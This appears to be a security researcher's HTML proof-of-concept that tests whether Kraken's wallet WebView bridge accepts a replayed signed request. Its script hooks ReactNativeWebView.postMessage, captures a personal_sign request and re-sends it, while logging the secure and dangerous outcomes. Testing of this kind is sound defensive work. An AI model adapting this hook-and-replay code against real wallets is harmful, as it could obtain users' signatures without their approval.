<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Kraken Bridge Replay Test New</title>
  <style>
    body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; line-height: 1.45; }
    button { display: block; margin: 10px 0; padding: 12px; font-size: 16px; width: 100%; }
    pre { background: #f4f4f4; border: 1px solid #ddd; padding: 12px; white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h1>Kraken Bridge Replay Test</h1>
  <p>
    This page captures a signed WebView bridge request generated by Kraken's injected provider,
    then replays the same signed request.
  </p>

  <button id="hook">1. Hook ReactNativeWebView.postMessage</button>
  <button id="connect">2. Connect EVM Wallet</button>
  <button id="sign">3. personal_sign once and capture signed bridge request</button>
  <button id="replay">4. Replay captured signed bridge request</button>

  <pre id="log"></pre>

  <script>
    let account = null;
    let originalPostMessage = null;
    let capturedRpcRequests = [];
    let capturedSignRequest = null;

    function log(...x) {
      const line = x.map(v => {
        try {
          if (typeof v === "object") return JSON.stringify(v);
          return String(v);
        } catch (_) {
          return String(v);
        }
      }).join(" ");
      document.getElementById("log").textContent += line + "\n";
      console.log(line);
    }

    function sleep(ms) {
      return new Promise(r => setTimeout(r, ms));
    }

    async function eth() {
      while (!window.ethereum) {
        await sleep(25);
      }
      return window.ethereum;
    }

    function hookPostMessage() {
      if (!window.ReactNativeWebView || typeof window.ReactNativeWebView.postMessage !== "function") {
        log("ERROR: ReactNativeWebView.postMessage not available");
        return;
      }

      if (originalPostMessage) {
        log("Already hooked");
        return;
      }

      originalPostMessage = window.ReactNativeWebView.postMessage.bind(window.ReactNativeWebView);

      window.ReactNativeWebView.postMessage = function(message) {
        try {
          const parsed = JSON.parse(message);

          if (parsed.method === "rpc_request") {
            capturedRpcRequests.push(message);

            log("CAPTURED_RPC_REQUEST:");
            log(message);

            if (
              parsed.context &&
              parsed.context.network === "evm" &&
              parsed.context.method === "personal_sign"
            ) {
              capturedSignRequest = message;
              log("CAPTURED_PERSONAL_SIGN_REQUEST_ID:", parsed.id);
            }
          }
        } catch (e) {
          log("postMessage parse error:", e.message || String(e));
        }

        return originalPostMessage(message);
      };

      log("Hook installed");
    }

    async function connect() {
      const provider = await eth();
      const accounts = await provider.request({ method: "eth_requestAccounts" });
      account = accounts[0];

      log("Connected account:", account);
      log("Current chain:", await provider.request({ method: "eth_chainId" }));
    }

    async function signOnce() {
      const provider = await eth();

      if (!account) {
        await connect();
      }

      const msg = "Kraken replay test: user should see exactly one approval before replay";
      const hex = "0x" + Array.from(new TextEncoder().encode(msg))
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");

      log("Calling personal_sign...");
      log("Expected: one approval popup now.");

      try {
        const sig = await provider.request({
          method: "personal_sign",
          params: [hex, account]
        });

        log("PERSONAL_SIGN_RESULT:");
        log(sig);
      } catch (e) {
        log("personal_sign error:", e.message || String(e));
      }
    }

    async function replayCaptured() {
      if (!capturedSignRequest) {
        log("ERROR: no captured personal_sign request yet");
        return;
      }

      if (!originalPostMessage) {
        log("ERROR: hook not installed");
        return;
      }

      log("Replaying captured personal_sign bridge request now.");
      log("Expected secure behavior: reject, ignore, or show a NEW approval popup.");
      log("Dangerous behavior: signature returned or action completes without a new popup.");

      originalPostMessage(capturedSignRequest);
    }

    document.getElementById("hook").onclick = hookPostMessage;
    document.getElementById("connect").onclick = connect;
    document.getElementById("sign").onclick = signOnce;
    document.getElementById("replay").onclick = replayCaptured;
  </script>
</body>
</html>
